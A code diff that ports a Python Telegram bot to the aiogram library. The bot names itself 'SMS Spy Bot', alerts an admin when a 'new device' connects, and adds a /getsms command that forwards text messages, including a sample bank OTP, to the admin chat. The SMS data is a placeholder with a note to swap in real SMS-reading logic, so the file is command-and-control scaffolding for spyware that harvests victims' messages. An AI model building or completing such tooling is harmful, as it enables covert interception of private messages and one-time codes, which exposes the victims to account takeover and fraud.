@@ -1,19 +1,43 @@
-import telegram
-from telegram.ext import Updater, CommandHandler
+import asyncio
 import json
+from aiogram import Bot, Dispatcher, types
+from aiogram.contrib.fsm_storage.memory import MemoryStorage
 
 # Load config
 with open('config.json') as f:
     config = json.load(f)
 
-bot = telegram.Bot(token=config['bot_token'])
-updater = Updater(token=config['bot_token'], use_context=True)
+bot = Bot(token=config['bot_token'])
+storage = MemoryStorage()
+dp = Dispatcher(bot, storage=storage)
 
-def start(update, context):
-    update.message.reply_text("🕵️ SMS Spy Active")
-    bot.send_message(chat_id=config['admin_chat_id'], text="✅ Bot is online!")
+@dp.message_handler(commands=['start'])
+async def start_command(message: types.Message):
+    await message.reply("🕵️ SMS Spy Bot - Online")
+    # Notify admin
+    await bot.send_message(config['admin_chat_id'], "✅ New device connected!")
 
-updater.dispatcher.add_handler(CommandHandler('start', start))
-print("Bot running... No server needed!")
-updater.start_polling()
-updater.idle()
+@dp.message_handler(commands=['getsms'])
+async def get_sms_command(message: types.Message):
+    if str(message.chat.id) == config['admin_chat_id']:
+        # Simulate SMS data - replace with actual SMS reading logic
+        sms_data = [
+            {"from": "Bank", "message": "OTP: 123456", "time": "12:30"},
+            {"from": "Friend", "message": "Hey, call me back", "time": "12:25"}
+        ]
+        
+        for sms in sms_data:
+            await message.reply(f"📱 From: {sms['from']}\n💬 {sms['message']}\n⏰ {sms['time']}")
+    else:
+        await message.reply("❌ Unauthorized")
+
+@dp.message_handler(commands=['status'])
+async def status_command(message: types.Message):
+    await message.reply("🟢 System Operational - Ready to receive SMS")
+
+async def main():
+    await dp.start_polling()
+
+if __name__ == '__main__':
+    print("🤖 SMS Spy Bot Starting...")
+    asyncio.run(main())
